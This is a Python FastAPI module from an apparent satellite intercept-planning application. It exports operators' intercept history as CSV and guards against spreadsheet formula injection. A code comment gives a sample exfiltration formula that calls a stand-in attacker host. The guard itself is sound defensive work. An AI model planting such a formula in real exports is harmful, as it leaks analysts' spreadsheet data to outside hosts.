"""Session-level planning utilities — export and summary routes.

Handles cross-cutting concerns that span the maneuver, threat, and asset layers
(intercept history export, future: session report generation).
"""

from __future__ import annotations

import csv
import io
import logging
import re
from datetime import UTC, datetime
from typing import Annotated, Any

from fastapi import APIRouter, Depends, Query, Request
from fastapi.responses import StreamingResponse

from spectre.web.auth import require_login
from spectre.web.log_safety import log_safe
from spectre.web.models import User
from spectre.web.planning_state import get_session_state

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/plan")

# Excel, LibreOffice Calc and Google Sheets evaluate a cell whose text begins
# with one of these as a formula. The rows below carry operator- and UDL-supplied
# strings (satellite names, segment names, notes, the operator's own username),
# so a name of ``=HYPERLINK("http://attacker/"&A1,"ok")`` runs in the analyst's
# spreadsheet on open. Nothing in SPECTRE executes it; the export is the carrier.
_CSV_FORMULA_LEADS = ("=", "+", "-", "@", "\t", "\r")

# A negative delta-v is written as "-123.456" and starts with a formula lead, so
# a blanket escape would quote every retrograde burn in the file and break the
# "importable into pandas without reshaping" promise in the docstring below.
# A number is not a formula, so numbers are let through unchanged.
_CSV_NUMERIC = re.compile(r"[-+]?\d+(\.\d+)?([eE][-+]?\d+)?")


def _csv_safe(field: object) -> object:
    """Return *field* in a form no spreadsheet will evaluate.

    The leading apostrophe is the convention Excel, Calc and Sheets all honour:
    the cell is forced to text and the apostrophe itself is not displayed. Only
    strings that actually start with a formula lead are touched, so the numeric
    columns and every ordinary name come through byte for byte.
    """
    if not isinstance(field, str) or not field.startswith(_CSV_FORMULA_LEADS):
        return field
    if _CSV_NUMERIC.fullmatch(field):
        return field
    return "'" + field


def _write_row(writer: Any, row: list[object]) -> None:
    """Write *row* with every field neutralised.

    Every row in this module goes through here rather than calling writerow
    directly, and a unit test walks this file's AST to keep it that way: an
    export added later must not be able to reintroduce the injection by
    reaching for csv.writer's own method.
    """
    writer.writerow([_csv_safe(field) for field in row])


@router.get("/export", response_model=None)
async def export_intercepts(
    request: Request,
    run_id: Annotated[
        str | None,
        Query(description="option_id of a specific run to export; omit for full session history"),
    ] = None,
    current_user: User = Depends(require_login),
) -> StreamingResponse:
    """Return the operator's intercept history as a downloadable CSV.

    One row is emitted per **burn** within each result so the file is
    importable directly into Excel or pandas without further reshaping.
    When a result produced no discrete burns (assessment-type methods)
    a single row is emitted with blank burn columns.

    Optionally filtered to a single run via ``?run_id=<option_id>``.
    """
    state = get_session_state(current_user.username)

    if run_id:
        results = [r for r in state.intercept_history if r.option_id == run_id]
        if not results and state.last_intercept_result and state.last_intercept_result.option_id == run_id:
            results = [state.last_intercept_result]
    else:
        results = list(state.intercept_history)

    buf = io.StringIO()
    writer = csv.writer(buf)

    # Metadata header (# comments are ignored by most parsers, readable as-is)
    now_utc = datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")
    _write_row(writer, [f"# SPECTRE Intercept Export — {now_utc} — Operator: {current_user.username}"])
    _write_row(writer, [f"# Runs: {len(results)}  Filter: {run_id or 'all'}"])
    _write_row(writer, [])

    _write_row(writer, [
        "run_id",
        "method",
        "red_name",
        "blue_name",
        "total_dv_m_s",
        "arrival_utc",
        "miss_km",
        "n_burns",
        "burn_num",
        "segment",
        "burn_epoch_utc",
        "burn_dv_m_s",
        "dv_prograde_m_s",
        "dv_normal_m_s",
        "dv_radial_m_s",
        "notes",
    ])

    for r in results:
        common = [
            r.option_id,
            r.method.value,
            r.red_name,
            r.blue_name,
            f"{r.total_delta_v_m_s:.3f}",
            r.arrival_epoch.strftime("%Y-%m-%d %H:%M:%S"),
            f"{r.intercept_range_km:.3f}",
            len(r.burns),
        ]
        if r.burns:
            for b in r.burns:
                _write_row(writer, [
                    *common,
                    b.burn_number,
                    b.segment_name,
                    b.burn_epoch.strftime("%Y-%m-%d %H:%M:%S"),
                    f"{b.delta_v_m_s:.3f}",
                    f"{b.dv_prograde:.3f}",
                    f"{b.dv_normal:.3f}",
                    f"{b.dv_radial:.3f}",
                    r.notes,
                ])
        else:
            _write_row(writer, [*common, "", "", "", "", "", "", "", r.notes])

    timestamp = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
    filename = (
        f"spectre_intercepts_{run_id}_{timestamp}.csv"
        if run_id
        else f"spectre_intercepts_{timestamp}.csv"
    )

    logger.info(
        "Intercept export: operator=%s rows=%d filter=%s filename=%s",
        log_safe(current_user.username), len(results), log_safe(run_id or "all"), log_safe(filename),
    )

    return StreamingResponse(
        iter([buf.getvalue()]),
        media_type="text/csv; charset=utf-8",
        headers={
            "Content-Disposition": f'attachment; filename="{filename}"',
            "Cache-Control": "no-store",
        },
    )
